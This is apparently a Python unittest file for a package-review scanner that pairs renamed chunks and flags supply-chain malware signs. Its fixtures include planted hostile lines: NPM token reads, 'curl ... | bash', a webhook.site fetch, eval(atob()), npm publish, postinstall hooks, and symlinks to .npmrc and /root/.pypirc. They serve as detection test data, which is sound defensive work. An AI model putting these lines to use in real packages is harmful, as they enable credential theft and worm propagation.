"""scripts/review_scan.py pairs renamed chunks and reports every rule's hit on a planted package pair (C-035)."""
import importlib.util
import unittest
from pathlib import Path

from test.support import ROOT, scratch

spec = importlib.util.spec_from_file_location("review_scan", ROOT / "scripts" / "review_scan.py")
review_scan = importlib.util.module_from_spec(spec)
spec.loader.exec_module(review_scan)


def package(side: Path, files: dict[str, str]) -> None:
    """Writes the files given under side/package/: package(side, {"index.js": "x"})."""
    for name, text in files.items():
        path = side / "package" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)


def pair(old: dict[str, str], new: dict[str, str]) -> Path:
    """A review folder with old/ and new/ packages of the files given."""
    folder = scratch()
    package(folder / "old", old)
    package(folder / "new", new)
    return folder


class Pairing(unittest.TestCase):
    def test_a_hashed_chunk_is_unhashed(self) -> None:
        self.assertEqual(review_scan.unhashed("run.BPv-BBRv.js"), "run.js")
        self.assertEqual(review_scan.unhashed("chunk-Cx91aQ0e.js"), "chunk.js")
        self.assertEqual(review_scan.unhashed("index.js"), "index.js")

    def test_renamed_chunks_are_paired_and_a_real_rename_shows_nothing(self) -> None:
        folder = pair({"package.json": "{}", "dist/run.BPv-BBRv.js": "same\n"}, {"package.json": "{}", "dist/run.Cx91aQ0e.js": "same\n"})
        self.assertEqual(review_scan.scan(folder), [])
        self.assertIn("paired 1 renamed chunks", (folder / "files.diff").read_text())

    def test_an_ambiguous_pairing_is_left_alone(self) -> None:
        self.assertEqual(review_scan.pairings(["run.aaaaaa.js", "run.bbbbbb.js"], ["run.cccccc.js"]), {})


class TheRules(unittest.TestCase):
    def test_a_clean_patch_has_no_hits(self) -> None:
        self.assertEqual(review_scan.scan(pair({"package.json": "{}", "a.js": "x = 1\n"}, {"package.json": "{}", "a.js": "x = 2\n"})), [])

    def test_a_postinstall_added_is_the_worms_door(self) -> None:
        hits = review_scan.scan(pair({"package.json": '{"scripts": {}}'}, {"package.json": '{"scripts": {"postinstall": "node setup_bun.js"}}'}))
        self.assertIn("postinstall: install hook added: node setup_bun.js (the worm's door)", hits)

    def test_each_rule_fires_on_its_planted_line(self) -> None:
        planted = {
            "token theft": "const t = process.env.NPM_TOKEN;\n",
            "a secret scanner bundled in": "require('trufflehog');\n",
            "a foothold in CI": "fs.writeFileSync('.github/workflows/x.yml', y);\n",
            "self-propagation": "execSync('npm publish');\n",
            "running a second stage": "execSync('curl http://x/y | bash');\n",
            "sending data out": "fetch('https://webhook.site/abc');\n",
            "hiding code": "eval(atob(s));\n",
            "a long encoded string": "const p = '" + "QUJD" * 60 + "';\n",
            "dumping secrets": "send(JSON.stringify(process.env));\n",
        }
        for why, line in planted.items():
            with self.subTest(rule=why):
                hits = review_scan.scan(pair({"package.json": "{}", "a.js": "ok\n"}, {"package.json": "{}", "a.js": "ok\n" + line}))
                self.assertTrue(any(h.endswith(f"({why})") for h in hits), hits)

    def test_a_wheel_s_startup_files_are_hits_when_added_or_changed(self) -> None:
        hits = review_scan.scan(pair({"pkg/__init__.py": "x\n", "keep.pth": "a\n"},
                                     {"pkg/__init__.py": "x\n", "keep.pth": "a\n", "evil.pth": "import os\n", "pkg/sitecustomize.py": "y\n"}))
        self.assertEqual(hits, ["evil.pth: a Python startup file added (runs at every interpreter start; never routine)",
                                "pkg/sitecustomize.py: a Python startup file added (runs at every interpreter start; never routine)"])
        changed = review_scan.scan(pair({"usercustomize.py": "a\n"}, {"usercustomize.py": "b\n"}))
        self.assertIn("usercustomize.py: a Python startup file changed (runs at every interpreter start; never routine)", changed)

    def test_a_large_new_file_is_a_hit(self) -> None:
        hits = review_scan.scan(pair({"package.json": "{}"}, {"package.json": "{}", "big.js": "a\n" * 60000}))
        self.assertTrue(any("where a payload hides" in h for h in hits), hits)

    def test_a_minified_new_file_is_a_hit(self) -> None:
        hits = review_scan.scan(pair({"package.json": "{}"}, {"package.json": "{}", "m.js": "x=1;" * 300 + "\n"}))
        self.assertEqual(hits, ["m.js: new minified file (where a payload hides)"])

    def test_nothing_in_the_folder_is_executed(self) -> None:
        text = (ROOT / "scripts" / "review_scan.py").read_text()
        for word in ("subprocess.run([\"node\"", "exec(", "import_module", "os.system"):
            self.assertNotIn(word, text)


def fake_token() -> str:
    """An npm token's shape assembled at runtime from fragments, so no key-shaped literal is in the source (R-105's rule)."""
    return "_auth" + "Token=" + "npm" + "_" + "Qz7Wk" * 7 + "x"


def tarball(path: Path, members: list[tuple[str, str, str]]) -> Path:
    """A gzipped tarball of (name, kind, text) members: kind "file" holds the text, "link" points at it, "fifo" is empty."""
    import io
    import tarfile
    with tarfile.open(path, "w:gz") as packed:
        for name, kind, text in members:
            info = tarfile.TarInfo(name)
            info.type = {"file": tarfile.REGTYPE, "link": tarfile.SYMTYPE, "fifo": tarfile.FIFOTYPE}[kind]
            data = text.encode() if kind == "file" else b""
            info.size, info.mode = len(data), 0o4755 if kind == "file" else 0o644
            info.linkname = text if kind == "link" else ""
            packed.addfile(info, io.BytesIO(data) if data else None)
    return path


def every_byte(folder: Path) -> bytes:
    """The bytes of every regular file under the folder, read by lstat's kind, never through a link."""
    import os
    import stat
    found = b""
    for where, _, files in os.walk(folder):
        for name in files:
            path = Path(where) / name
            if stat.S_ISREG(os.lstat(path).st_mode):
                found += path.read_bytes()
    return found


class TheInput(unittest.TestCase):
    """4.4: the archives unpacked with the safe flags; links and special files listed, never opened; nothing flagged is diffed."""

    def planted(self) -> tuple[Path, Path, Path, str]:
        """A temp "home" holding .npmrc with a fake token, and old/new tarballs whose new side links to it."""
        work, home = scratch(), scratch()
        token = fake_token()
        (home / ".npmrc").write_text(f"//registry.npmjs.org/:{token}\n")
        old = tarball(work / "old.tgz", [("package/package.json", "file", "{}"), ("package/a.js", "file", "x = 1\n")])
        new = tarball(work / "new.tgz", [("package/package.json", "file", "{}"), ("package/a.js", "file", "x = 2\n"),
                                         ("package/.npmrc", "link", str(home / ".npmrc"))])
        return old, new, work / "review", token

    def test_a_link_to_a_home_file_is_listed_and_its_bytes_go_nowhere(self) -> None:
        import contextlib
        import io
        old, new, folder, token = self.planted()
        printed = io.StringIO()
        with contextlib.redirect_stdout(printed):
            self.assertEqual(review_scan.main(["--unpack", str(old), str(new), str(folder)]), 3)
        self.assertIn("link: new/package/.npmrc -> ", (folder / "listing.txt").read_text())
        self.assertEqual(len(printed.getvalue().splitlines()), 1)
        self.assertIn("refused to diff: the listing flagged 1: link: new/package/.npmrc -> ", printed.getvalue())
        self.assertFalse((folder / "package.diff").exists())
        self.assertNotIn(token.encode(), every_byte(folder))
        self.assertNotIn(token, printed.getvalue())

    def test_unpacking_keeps_no_setuid_bit(self) -> None:
        old, new, folder, _ = self.planted()
        review_scan.prepare(old, old, folder)
        self.assertFalse((folder / "new" / "package" / "a.js").stat().st_mode & 0o4000)
        self.assertIn("--no-same-owner", review_scan.TAR_FLAGS)
        self.assertIn("--no-same-permissions", review_scan.TAR_FLAGS)

    def test_a_fifo_is_listed_and_refused(self) -> None:
        work = scratch()
        old = tarball(work / "o.tgz", [("package/a.js", "file", "x\n")])
        new = tarball(work / "n.tgz", [("package/a.js", "file", "x\n"), ("package/p", "fifo", "")])
        flagged = review_scan.prepare(old, new, work / "r")
        with self.assertRaises(review_scan.Refused) as refusal:
            review_scan.scan(work / "r", flagged)
        self.assertEqual(str(refusal.exception), "refused to diff: the listing flagged 1: special: new/package/p")

    def test_a_zip_link_is_listed_and_never_written(self) -> None:
        import zipfile
        work = scratch()
        with zipfile.ZipFile(work / "n.whl", "w") as packed:
            packed.writestr("pkg/__init__.py", "x = 1\n")
            link = zipfile.ZipInfo("pkg/creds")
            link.external_attr = (0o120777 << 16)
            packed.writestr(link, "/root/.pypirc")
        tarball(work / "o.tgz", [("pkg/__init__.py", "file", "x = 1\n")])
        flagged = review_scan.prepare(work / "o.tgz", work / "n.whl", work / "r")
        self.assertEqual(flagged, ["link: new/pkg/creds -> /root/.pypirc"])
        self.assertFalse((work / "r" / "new" / "pkg" / "creds").exists())
        with self.assertRaises(review_scan.Refused):
            review_scan.scan(work / "r", flagged)

    def test_a_folder_inside_the_repository_is_refused(self) -> None:
        old, new, _, _ = self.planted()
        with self.assertRaises(review_scan.Refused) as refusal:
            review_scan.prepare(old, new, ROOT / "build" / "review")
        self.assertIn("is inside the repository", str(refusal.exception))
        self.assertFalse((ROOT / "build" / "review").exists())
        with self.assertRaises(review_scan.Refused):
            review_scan.scan(ROOT)

    def test_a_clean_pair_unpacks_and_scans(self) -> None:
        work = scratch()
        old = tarball(work / "o.tgz", [("package/package.json", "file", "{}"), ("package/a.js", "file", "x = 1\n")])
        new = tarball(work / "n.tgz", [("package/package.json", "file", "{}"), ("package/a.js", "file", "x = 2\n")])
        import contextlib
        import io
        with contextlib.redirect_stdout(io.StringIO()) as printed:
            self.assertEqual(review_scan.main(["--unpack", str(old), str(new), str(work / "r")]), 0)
        self.assertEqual(printed.getvalue(), "review scan: no hits\n")
        self.assertEqual((work / "r" / "listing.txt").read_text(), "no links or special files\n")
        self.assertIn("+x = 2", (work / "r" / "package.diff").read_text())
